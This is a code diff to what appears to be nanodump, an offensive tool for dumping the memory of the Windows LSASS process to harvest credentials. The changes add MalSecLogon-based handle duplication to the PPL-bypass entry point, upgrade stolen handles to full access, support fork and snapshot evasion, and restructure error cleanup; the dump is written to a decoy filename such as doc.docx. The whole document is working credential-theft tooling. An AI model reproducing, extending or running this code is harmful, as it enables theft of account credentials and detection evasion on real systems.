@@ -114,7 +114,6 @@ void go(char* args, int length)
             &dc.ImplementationVersion);
     }
 
-    // by default, PROCESS_QUERY_INFORMATION|PROCESS_VM_READ
     DWORD permissions = LSASS_DEFAULT_PERMISSIONS;
     // if we used MalSecLogon remotely, the handle won't have PROCESS_CREATE_PROCESS;
     if ((fork_lsass || snapshot_lsass) && !use_malseclogon_remotely)
@@ -200,7 +199,7 @@ void go(char* args, int length)
     if (use_malseclogon_remotely)
     {
         kill_created_processes(created_processes);
-        created_processes = NULL;
+        intFree(created_processes); created_processes = NULL;
     }
 
     if (!success)
@@ -510,7 +509,6 @@ int main(int argc, char* argv[])
             &dc.ImplementationVersion);
     }
 
-    // by default, PROCESS_QUERY_INFORMATION|PROCESS_VM_READ
     DWORD permissions = LSASS_DEFAULT_PERMISSIONS;
     if ((fork_lsass || snapshot_lsass) && !use_malseclogon_remotely)
     {
@@ -594,7 +592,7 @@ int main(int argc, char* argv[])
     if (use_malseclogon_remotely)
     {
         kill_created_processes(created_processes);
-        created_processes = NULL;
+        intFree(created_processes); created_processes = NULL;
     }
 
     if (!success)
@@ -725,8 +723,7 @@ BOOL NanoDumpSSP(void)
 __declspec(dllexport) BOOL APIENTRY DllMain(
     HINSTANCE hinstDLL,
     DWORD fdwReason,
-    LPVOID lpReserved
-)
+    LPVOID lpReserved)
 {
     switch (fdwReason)
     {
@@ -750,16 +747,24 @@ __declspec(dllexport) BOOL APIENTRY DllMain(
 BOOL NanoDumpPPL(VOID)
 {
     dump_context   dc;
-    DWORD          lsass_pid        = 0;
-    BOOL           fork_lsass       = FALSE;
-    BOOL           snapshot_lsass   = FALSE;
-    BOOL           duplicate_handle = FALSE;
-    BOOL           success          = TRUE;
-    BOOL           use_valid_sig    = FALSE;
+    BOOL           bReturnValue      = FALSE;
+    HANDLE         hProcess          = NULL;
+    DWORD          lsass_pid         = 0;
+    BOOL           fork_lsass        = FALSE;
+    BOOL           snapshot_lsass    = FALSE;
+    BOOL           duplicate_handle  = FALSE;
+    BOOL           success           = TRUE;
+    BOOL           use_valid_sig     = FALSE;
+    BOOL           use_malseclogon   = FALSE;
+    BOOL           binary_provided   = FALSE;
+    PPROCESS_LIST  created_processes = NULL;
+    HANDLE         hSnapshot         = NULL;
+    SIZE_T         region_size       = 0;
+    PVOID          base_address      = NULL;
     CHAR           dump_path[MAX_PATH];
-    wchar_t        wcFilePath[MAX_PATH];
+    CHAR           malseclogon_target_binary[MAX_PATH];
+    WCHAR          wcFilePath[MAX_PATH];
     UNICODE_STRING full_dump_path;
-    HANDLE         hSnapshot;
 
     full_dump_path.Buffer        = wcFilePath;
     full_dump_path.Length        = 0;
@@ -769,21 +774,21 @@ BOOL NanoDumpPPL(VOID)
     if(local_is_wow64())
     {
         PRINT_ERR("Nanodump does not support WoW64");
-        return -1;
+        return FALSE;
     }
 #endif
 
-    remove_syscall_callback_hook();
+    //remove_syscall_callback_hook();
 
     success = delete_known_dll_entry();
     if (!success)
-        return FALSE;
+        goto end;
 
     LPWSTR* argv = NULL;
     int argc = 0;
     argv = CommandLineToArgvW(GetCommandLineW(), &argc);
     if (!argv || !argc)
-        return FALSE;
+        goto end;
 
     for (int i = 1; i < argc; ++i)
     {
@@ -798,7 +803,7 @@ BOOL NanoDumpPPL(VOID)
             if (i + 1 >= argc)
             {
                 PRINT("missing --write value");
-                return -1;
+                goto end;
             }
             wcstombs(dump_path, argv[++i], MAX_PATH);
             get_full_path(&full_dump_path, dump_path);
@@ -809,7 +814,7 @@ BOOL NanoDumpPPL(VOID)
             if (i + 1 >= argc)
             {
                 PRINT("missing --pid value");
-                return -1;
+                goto end;
             }
             i++;
             lsass_pid = wcstoul(argv[i], NULL, 10);
@@ -829,24 +834,70 @@ BOOL NanoDumpPPL(VOID)
         {
             duplicate_handle = TRUE;
         }
+        else if (!_wcsicmp(argv[i], L"-m") ||
+                 !_wcsicmp(argv[i], L"--malseclogon"))
+        {
+            use_malseclogon = TRUE;
+        }
+        else if (!_wcsicmp(argv[i], L"-b") ||
+                 !_wcsicmp(argv[i], L"--binary"))
+        {
+            if (i + 1 >= argc)
+            {
+                PRINT("missing --binary value");
+                goto end;
+            }
+            wcstombs(malseclogon_target_binary, argv[++i], MAX_PATH);
+            binary_provided = TRUE;
+        }
         else
         {
             PRINT("invalid argument: %s", argv[i]);
-            return -1;
+            goto end;
         }
     }
 
     LocalFree(argv); argv = NULL;
 
     if (!full_dump_path.Length)
-    {
-        return FALSE;
-    }
+        goto end;
 
     if (fork_lsass && snapshot_lsass)
     {
         PRINT("The options --fork and --snapshot cannot be used at the same time");
-        return FALSE;
+        goto end;
+    }
+
+    if (use_malseclogon && (fork_lsass || snapshot_lsass))
+    {
+        PRINT("In this mode, MalSecLogon cannot be used with --fork or --snapshot.");
+        goto end;
+    }
+
+    if (use_malseclogon && !duplicate_handle)
+    {
+        PRINT("In this mode, if MalSecLogon is being used, --dup must be provided.");
+        goto end;
+    }
+
+    if (use_malseclogon && !binary_provided)
+    {
+        PRINT("In this mode, if MalSecLogon is being used, --binary must be provided.");
+        goto end;
+    }
+
+    if (binary_provided &&
+        !is_full_path(malseclogon_target_binary))
+    {
+        PRINT("You need to provide the full path: %s", malseclogon_target_binary);
+        goto end;
+    }
+
+    if (binary_provided &&
+        !file_exists(malseclogon_target_binary))
+    {
+        PRINT("The binary \"%s\" does not exists.", malseclogon_target_binary);
+        goto end;
     }
 
     // if not provided, get the PID of LSASS
@@ -854,7 +905,7 @@ BOOL NanoDumpPPL(VOID)
     {
         lsass_pid = get_lsass_pid();
         if (!lsass_pid)
-            return FALSE;
+            goto end;
     }
     else
     {
@@ -864,15 +915,30 @@ BOOL NanoDumpPPL(VOID)
     if (!full_dump_path.Length)
     {
         PRINT("You must provide the dump file: --write C:\\Windows\\Temp\\doc.docx");
-        return FALSE;
+        goto end;
     }
 
     success = enable_debug_priv();
     if (!success)
-        return FALSE;
+        goto end;
 
     if (!create_file(&full_dump_path))
-        return FALSE;
+        goto end;
+
+    if (use_malseclogon)
+    {
+        success = MalSecLogon(
+            malseclogon_target_binary,
+            dump_path,
+            fork_lsass,
+            snapshot_lsass,
+            use_valid_sig,
+            FALSE,
+            lsass_pid,
+            &created_processes);
+        if (!success)
+            goto end;
+    }
 
     // set the signature
     if (use_valid_sig)
@@ -891,21 +957,29 @@ BOOL NanoDumpPPL(VOID)
             &dc.ImplementationVersion);
     }
 
-    // by default, PROCESS_QUERY_INFORMATION|PROCESS_VM_READ
     DWORD permissions = LSASS_DEFAULT_PERMISSIONS;
-    if (fork_lsass || snapshot_lsass)
+    if ((fork_lsass || snapshot_lsass) && !use_malseclogon)
     {
         permissions = LSASS_CLONE_PERMISSIONS;
     }
 
-    HANDLE hProcess = obtain_lsass_handle(
+    hProcess = obtain_lsass_handle(
         lsass_pid,
         permissions,
         duplicate_handle,
         FALSE,
         dump_path);
     if (!hProcess)
-        return FALSE;
+        goto end;
+
+    // if MalSecLogon was used, the handle does not have PROCESS_CREATE_PROCESS
+    if ((fork_lsass || snapshot_lsass) && use_malseclogon)
+    {
+        hProcess = make_handle_full_access(
+            hProcess);
+        if (!hProcess)
+            goto end;
+    }
 
     // avoid reading LSASS directly by making a fork
     if (fork_lsass)
@@ -913,7 +987,7 @@ BOOL NanoDumpPPL(VOID)
         hProcess = fork_process(
             hProcess);
         if (!hProcess)
-            return FALSE;
+            goto end;
     }
 
     // avoid reading LSASS directly by making a snapshot
@@ -923,18 +997,14 @@ BOOL NanoDumpPPL(VOID)
             hProcess,
             &hSnapshot);
         if (!hProcess)
-            return FALSE;
+            goto end;
     }
 
     // allocate a chuck of memory to write the dump
-    SIZE_T region_size = DUMP_MAX_SIZE;
-    PVOID base_address = allocate_memory(&region_size);
+    region_size = DUMP_MAX_SIZE;
+    base_address = allocate_memory(&region_size);
     if (!base_address)
-    {
-        NtClose(hProcess); hProcess = NULL;
-        delete_file(dump_path);
-        return FALSE;
-    }
+        goto end;
 
     dc.hProcess    = hProcess;
     dc.BaseAddress = base_address;
@@ -951,23 +1021,8 @@ BOOL NanoDumpPPL(VOID)
             hProcess);
     }
 
-    // close the handle
-    NtClose(hProcess); hProcess = NULL; dc.hProcess = NULL;
-
-    // free the created snapshot
-    if (snapshot_lsass)
-    {
-        free_snapshot(
-            hSnapshot);
-        hSnapshot = NULL;
-    }
-
     if (!success)
-    {
-        erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
-        delete_file(dump_path);
-        return FALSE;
-    }
+        goto end;
 
     DPRINT(
         "The dump was created successfully, final size: %d MiB",
@@ -983,22 +1038,35 @@ BOOL NanoDumpPPL(VOID)
         dc.BaseAddress,
         dc.rva);
 
-    erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
-
     if (!success)
-    {
+        goto end;
+
+    bReturnValue = TRUE;
+
+end:
+    if (argv)
+        LocalFree(argv);
+    if (base_address && region_size)
+        erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
+    if (hProcess)
+        NtClose(hProcess);
+    if (hSnapshot)
+        free_snapshot(hSnapshot);
+    if (!bReturnValue)
         delete_file(dump_path);
-        return FALSE;
+    if (created_processes)
+    {
+        kill_created_processes(created_processes);
+        intFree(created_processes);
     }
 
-    return TRUE;
+    return bReturnValue;
 }
 
 __declspec(dllexport) BOOL APIENTRY DllMain(
     HINSTANCE hinstDLL,
     DWORD fdwReason,
-    LPVOID lpReserved
-)
+    LPVOID lpReserved)
 {
     switch (fdwReason)
     {
